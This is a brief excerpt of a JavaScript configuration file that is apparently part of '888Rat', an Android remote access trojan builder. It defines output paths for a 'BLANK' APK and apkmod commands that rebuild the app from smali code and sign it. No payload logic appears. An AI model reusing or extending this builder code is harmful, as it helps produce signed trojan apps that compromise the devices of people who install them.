...
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/888_BLANK.apk.apk')

exports.termuxApkBuildPath = exports.termux + '/888Rat/build.apk'
exports.termuxApkSignedBuildPath = exports.termux + '/888Rat/888_BLANK.apk'
...
exports.termuxBuildCommand = 'apkmod' + ' -r "' + exports.smaliPath + '" -p "' + exports.termuxApkBuildPath + '"';
exports.termuxSignCommand = 'apkmod -s "' + exports.termuxApkBuildPath + '"' + ' -p ' + '"' + exports.termuxApkSignedBuildPath + '"' ;
